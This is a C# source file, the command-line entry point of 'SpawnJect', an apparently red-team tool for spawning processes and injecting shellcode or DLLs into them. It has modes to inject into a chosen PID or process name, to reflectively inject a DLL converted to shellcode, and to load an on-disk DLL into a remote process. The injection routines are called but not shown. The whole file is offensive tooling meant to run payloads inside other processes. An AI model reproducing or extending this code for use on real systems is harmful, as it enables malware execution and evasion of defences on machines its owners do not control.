using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace SpawnJect
{
    class Program
    {

        static void Usage()
        {
            //injection type can be supplied but doesn't need to be; will default to classic injection method
            Console.WriteLine(".\\SpawnJect.exe command=spawn arch=x64 injmethod=default");
            Console.WriteLine(".\\SpawnJect.exe command=spawnto program=c:\\windows\\system32\\cmd.exe arch=x64 injmethod=default");
            Console.WriteLine(".\\SpawnJect.exe command=inject [pid=3546 | processname=notepad] arch=x64 injmethod=default");
            //reflective native dll injection thanks to @monoxgas sRDI
            Console.WriteLine(".\\SpawnJect.exe command=dllinject pid=3546 arch=x64 injmethod=default dllpath=c:\\windows\\tasks\\my.dll");
            //native dll injection of on-disk dll
            Console.WriteLine(".\\SpawnJect.exe command=dllload pid=3546 arch=x64 dllpath=c:\\windows\\tasks\\my.dll");
        }


        static void Main(string[] args)
        {

            Console.WriteLine("Doing spawnject things...");

            if (args.Length < 1)
            {
                Usage();
                return;
            }

            var arguments = new Dictionary<string, string>();
            foreach (string argument in args)
            {
                int idx = argument.IndexOf('=');
                if (idx > 0)
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
            }

            string injMethod = "default";
            if (arguments.ContainsKey("injmethod"))
            {
                injMethod = arguments["injmethod"].ToLower();
            }

            //default to x86
            bool x64Bit = false;

            if (arguments.ContainsKey("arch"))
            {
                if (arguments["arch"] == "x64")
                {
                    x64Bit = true;
                }
            }


            if (arguments.ContainsKey("command"))
            {

                if (arguments["command"] == "spawn")
                {
                    Console.WriteLine("from spawn");
                    SpawnJect.Commands.CommandOps.Spawn(x64Bit, injMethod);
                }

                else if (arguments["command"] == "spawnto")
                {
                    Console.WriteLine("from spawnto");
                    if (arguments.ContainsKey("program"))
                    {
                        string spawnProg = arguments["program"];
                        SpawnJect.Commands.CommandOps.Spawnto(spawnProg, x64Bit, injMethod);
                    }
                    else
                    {
                        Console.WriteLine("spawnto needs a program!");
                        return;
                    }

                }

                else if (arguments["command"] == "inject")
                {
                    Console.WriteLine("from inject");
                    if (arguments.ContainsKey("pid"))
                    {
                        //check to ensure arch of given pid matches arch of arch= flag
                        int pid = Int32.Parse(arguments["pid"]);
                        SpawnJect.Commands.CommandOps.Inject(pid, x64Bit, injMethod);
                    }

                    else if (arguments.ContainsKey("processname"))
                    {
                        string processname = arguments["processname"];
                        Process[] procArr = Process.GetProcessesByName(processname);
                        int pid = procArr[0].Id;
                        SpawnJect.Commands.CommandOps.Inject(pid, x64Bit, injMethod);
                    }

                    else
                    {
                        Console.WriteLine("gotta supply a pid or processname to inject into!");
                        return;
                    }

                }

                //reflective dll injection thanks to @monoxgas sRDI
                else if (arguments["command"] == "dllinject")
                {

                    Console.WriteLine("from dllinject");

                    //from monoxgas sRDI
                    byte[] data = null;
                    byte[] userData = System.Text.Encoding.Default.GetBytes("j\0");

                    if (arguments.ContainsKey("pid"))
                    {
                        //check to ensure arch of given pid matches arch of arch= flag
                        int pid = Int32.Parse(arguments["pid"]);

                        if (arguments.ContainsKey("dllpath"))
                        {

                            //from monoxgas sRDI
                            data = System.IO.File.ReadAllBytes(arguments["dllpath"]);

                            byte[] shellcode;

                            if (data[0] == 'M' && data[1] == 'Z')
                            {
                                shellcode = Reflection.ReflectionOps.ConvertToShellcode(data, Reflection.ReflectionOps.HashFunction("blah"), userData, 0);

                                Console.WriteLine("[+] Converted DLL to shellcode");
                            }

                            //is this for supplying a .bin of shellcode?
                            else
                            {
                                shellcode = data;
                            }
                            SpawnJect.Commands.CommandOps.DllInject(pid, x64Bit, injMethod, shellcode);
                        }

                        else
                        {
                            Console.WriteLine("you need to provide a dll to inject into the remote process!");
                            return;
                        }  
                    }

                    else
                    {
                        Console.WriteLine("gotta supply a pid to inject into!");
                        return;
                    }
                }


                //dll injection of on-disk dll
                else if (arguments["command"] == "dllload")
                {
                    Console.WriteLine("from dllload");

                    if (arguments.ContainsKey("pid"))
                    {
                        //check to ensure arch of given pid matches arch of arch= flag
                        int pid = Int32.Parse(arguments["pid"]);

                        if (arguments.ContainsKey("dllpath"))
                        {
                            SpawnJect.Commands.CommandOps.DllLoad(pid, x64Bit, arguments["dllpath"]);
                        }

                        else
                        {
                            Console.WriteLine("you need to provide a dll to inject into the remote process!");
                            return;
                        }
                    }

                    else
                    {
                        Console.WriteLine("gotta supply a pid to inject into!");
                        return;
                    }
                }

                else
                {
                    Console.WriteLine("not supported");
                    return;
                }
            }

            else
            {
                Console.WriteLine("not supported");
                return;

            }
        }
    }
}
